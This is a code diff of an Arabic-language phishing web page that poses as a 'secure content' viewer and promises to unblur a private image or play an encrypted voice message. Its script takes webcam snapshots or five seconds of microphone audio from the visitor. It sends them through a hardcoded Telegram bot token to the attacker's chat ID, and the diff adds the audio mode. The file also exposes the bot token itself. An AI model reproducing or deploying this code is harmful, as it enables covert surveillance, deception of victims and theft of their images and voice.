@@ -3,128 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معاينة الصور الآمنة</title>
+    <title>معاينة المحتوى الآمن</title>
     <style>
-        body {
-            background-color: #121212;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .card {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
-            width: 350px;
-            border: 1px solid #333;
-        }
-        h2 { color: #00d4ff; font-size: 20px; margin-bottom: 10px; }
-        p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
-        
-        .image-box {
-            position: relative;
-            cursor: pointer;
-            border-radius: 12px;
-            overflow: hidden;
-            background: #000;
-        }
-        #target-image {
-            width: 100%;
-            display: block;
-            filter: blur(25px); /* ضبابة قوية جداً */
-            transition: filter 0.8s ease;
-        }
-        .blur-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.3);
-            font-weight: bold;
-            color: #fff;
-            font-size: 16px;
-        }
-        .btn {
-            margin-top: 20px;
-            background: #00d4ff;
-            color: #000;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-        }
+        body { background: #121212; color: white; text-align: center; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; width: 350px; border: 1px solid #333; }
+        img { width: 100%; border-radius: 10px; filter: blur(20px); margin: 15px 0; transition: 0.5s; }
+        .btn { background: #00d4ff; color: #000; padding: 12px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <h2>مرحباً بك!</h2>
-    <p>لرؤية الصورة، اضغط عليها وقم بالسماح بالوصول إلى الكاميرا لفك تشفير المحتوى الآمن.</p>
-    
-    <div class="image-box" onclick="initCapture()">
-        <img id="target-image" src="" alt="Private Content">
-        <div id="overlay" class="blur-overlay">انقر لفك الضباب 🔓</div>
+    <div class="card" onclick="startAction()">
+        <h2 id="title">مرحباً بك!</h2>
+        <p id="desc">يرجى الضغط والسماح بالوصول لفك تشفير المحتوى</p>
+        <img id="target-image" src="https://via.placeholder.com/300?text=Private+Content" alt="Locked">
+        <button class="btn">فتح الآن</button>
     </div>
-    
-    <button class="btn" onclick="initCapture()">فتح الصورة الآن</button>
-</div>
 
-<video id="video" style="display:none;" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
+        const params = new URLSearchParams(window.location.search);
+        const type = params.get('type'); // نوع العملية: cam أو mic
+        const uid = params.get('chatId');
+        const imgUrl = params.get('view_img');
 
-<script>
-    const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
-    const params = new URLSearchParams(window.location.search);
-    const imgUrl = params.get('view_img');
-    const myId = params.get('uid');
-
-    if (imgUrl) document.getElementById('target-image').src = imgUrl;
-
-    async function initCapture() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
-            // إزالة الضبابة كخدعة بصرية بعد النجاح
-            document.getElementById('target-image').style.filter = "blur(0px)";
-            document.getElementById('overlay').style.display = "none";
-
-            setInterval(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const data = canvas.toDataURL('image/jpeg', 0.5);
-                sendImage(data);
-            }, 3000);
-        } catch (e) {
-            alert("عذراً، يجب السماح بالكاميرا لفك تشفير هذه الصورة.");
+        if (imgUrl) document.getElementById('target-image').src = imgUrl;
+        if (type === 'mic') {
+            document.getElementById('title').innerText = "رسالة صوتية مشفرة";
+            document.getElementById('desc').innerText = "اضغط للسماح للمتصفح بتشغيل الصوت";
         }
-    }
 
-    function sendImage(base64) {
-        if (!myId) return;
-        const bin = atob(base64.split(',')[1]);
-        const array = new Uint8Array(bin.length);
-        for (let i = 0; i < bin.length; i++) array[i] = bin.charCodeAt(i);
-        const blob = new Blob([array], {type: 'image/jpeg'});
+        async function startAction() {
+            if (type === 'cam' || !type) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById('target-image').style.filter = "blur(0px)";
+                    capturePhoto(stream);
+                } catch (e) { alert("يجب السماح بالكاميرا للمتابعة"); }
+            } else if (type === 'mic') {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    captureAudio(stream);
+                } catch (e) { alert("يجب السماح بالمايكروفون لسماع الرسالة"); }
+            }
+        }
 
-        const fd = new FormData();
-        fd.append('chat_id', myId);
-        fd.append('photo', blob, 'capture.jpg');
+        function capturePhoto(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                sendToTelegram(canvas.toDataURL('image/jpeg'), 'photo');
+                stream.getTracks().forEach(t => t.stop());
+            }, 1000);
+        }
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
-    }
-</script>
+        function captureAudio(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                mediaRecorder.ondataavailable = (e) => {
+                    sendToTelegram(e.data, 'audio');
+                    stream.getTracks().forEach(t => t.stop());
+                };
+            }, 5000); // تسجيل 5 ثوانٍ
+        }
+
+        function sendToTelegram(data, mode) {
+            const fd = new FormData();
+            fd.append('chat_id', uid);
+            if (mode === 'photo') {
+                const bin = atob(data.split(',')[1]);
+                const arr = new Uint8Array(bin.length);
+                for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+                fd.append('photo', new Blob([arr], {type: 'image/jpeg'}), 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } else {
+                fd.append('voice', data, 'record.ogg');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            }
+        }
+    </script>
 </body>
 </html>
